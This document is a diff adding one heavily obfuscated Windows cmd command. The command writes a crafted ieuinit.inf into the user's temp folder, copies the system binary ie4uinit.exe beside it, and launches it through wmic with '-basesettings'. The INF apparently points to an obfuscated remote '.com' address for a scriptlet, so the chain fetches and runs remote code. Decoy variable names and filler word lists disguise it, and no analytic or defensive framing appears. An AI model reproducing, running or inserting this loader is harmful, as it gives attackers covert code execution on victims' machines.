@@ -1,0 +1,7 @@
+/v /c (for %n in (s) do @set "Struggle=%~n") &&
+  (for %x in (a) do @set "Pluck=%~x") &&
+  (for %h in (i) do @set "Films=%~h") &&
+  (for %h in (c) do @set "Section=%~h") &&
+  call(for %n in ("[strings]" "Societies=t;Belongs" "Media=:;Thank" "Victory=init" "Castle=/" "Parties=b;Barnes" "shortsvcname=' '" "Fluid=h" "servicename=' '" "Anxiety=%t!Films!me%" "Headers=com" "[defaultinstall.windows7]" "delfiles=C12" "Un\" "Register\" "OCXs=E99C2" "[C12]" "ieu%Victory%.inf" "[destinationdirs]" "C12=01" "defaultdestdir=11" "[version]" "signature =$windows nt$" "[E99C2]" "sc\" "ro%Parties%j,NI,%Fluid%%Societies%%Societies%p%Media%%Castle%%Castle%paijbvirw!Pra!Section!ti!Section!e!%Headers%/raoksrn" ) do @echo %~n)>"%loc!Tourist!l!Tourist!ppdata%\temp\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!FilmssHuman!ir%\system32\ie4uinit.exe "%loc!Tourist!l!Tourist!ppdata%\temp\*" | set Trials9=Pelican &&
+  start "" wmic process call create "%loc!Tourist!l!Tourist!ppdata%\temp\ie4uinit.exe -basesettings" | set "Trials80=Tomato Today Findings Losses Silly Knives Packs Visits Seeks Spoon Advice Stamps Notebooks Argue Parts Denial Techniques Noble Message Rapid Champions Version Author Issue Effectiveness Elite Still Flags Prisoners Agencies Collectors Opportunities Appeals Refugees Gives Hazard Plate Zones Knights Seminars Genuine"
